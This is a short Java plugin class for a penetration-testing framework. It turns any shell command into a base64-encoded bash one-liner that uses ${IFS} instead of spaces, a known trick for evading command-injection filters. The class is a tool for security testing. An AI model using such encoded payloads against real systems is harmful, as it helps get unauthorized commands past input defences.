package me.gv7.woodpecker.plugin.payload;

import me.gv7.woodpecker.plugin.*;
import sun.misc.BASE64Encoder;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class BashCommand2Encoder implements IHelper {
    @Override
    public String getHelperTabCaption() {
        return "Bash IFS Encoder";
    }

    @Override
    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = RuntimeExecEncoder.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg args1 = RuntimeExecEncoder.pluginHelper.createArg();
        args1.setName("all");
        args1.setDefaultValue("whoami");
        args1.setDescription("write text");
        args1.setRequired(true);
        args.add(args1);
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    @Override
    public void doHelp(Map<String, Object> customArgs, IResultOutput iResultOutput) {
        String cmd = (String)customArgs.get("all");
        try {
            cmd = "sh -c '"+cmd+"'";
            String payload = new BASE64Encoder().encode(cmd.getBytes()).replaceAll("\\s+","");
            String command = String.format("/bin/bash -c echo${IFS}-n${IFS}%s|base64${IFS}-d|/bin/bash",payload);
            iResultOutput.infoPrintln("不能包含双引号");
            iResultOutput.successPrintln("encode result:");
            iResultOutput.rawPrintln(command);
            iResultOutput.rawPrintln("\n");
        }catch (Exception ignored){}
    }
}
